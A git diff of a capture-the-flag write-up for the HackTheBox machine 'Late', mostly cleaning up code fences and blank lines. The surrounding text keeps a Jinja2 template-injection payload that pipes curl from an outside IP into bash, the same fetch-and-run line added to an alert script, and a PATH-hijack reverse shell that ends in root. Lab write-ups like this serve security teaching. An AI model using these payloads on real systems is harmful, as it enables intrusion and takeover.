@@ -116,16 +116,13 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 ```python
-```python
 {{ cycler.__init__.__globals__.os.popen('curl 10.10.16.8 | bash').read() }}
-```
 
 ```
+
 the image should look like this, white background black font helps:
 
 ![](/home/werz/Desktop/ctf/htb/writeup/CTF-writeups/HTB/Machines/late/img/rev_pay.png)
-
-
 
 and we have a shell!
 
@@ -292,8 +289,6 @@ svc_acc@late:/usr/local/sbin$ echo "curl 10.10.16.8 | bash" >> ssh-alert.sh
 
 So it fails for some reasons. checking the content of `ssh-alert.sh` file again we found that `data` and  `uname` commands are not used with their absolute path (full path). If any command is not used with its absolute path in any bash script, then it creates PATH hijacking vulnerability which often leads to privilege escalation. [more...](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
-
-
 ```bash
 svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh 
 #!/bin/bash
@@ -315,7 +310,6 @@ A SSH login was detected.
 if [ ${PAM_TYPE} = "open_session" ]; then
         echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
 fi
-
 ```
 
 if we check the PATH environment variable:
@@ -326,8 +320,6 @@ svc_acc@late:/usr/local/sbin$ echo $PATH
 ```
 
 So it's clear enough now, I'll hijack the `date` command as follows:
-
-
 
 ```bash
 svc_acc@late:/usr/local/sbin$ echo 'bash -i >& /dev/tcp/10.10.16.8/9002 0>&1' > date
@@ -405,5 +397,3 @@ smmta:*:19006:0:99999:7:::
 smmsp:*:19006:0:99999:7:::
 root@late:/# 
 ```
-
-
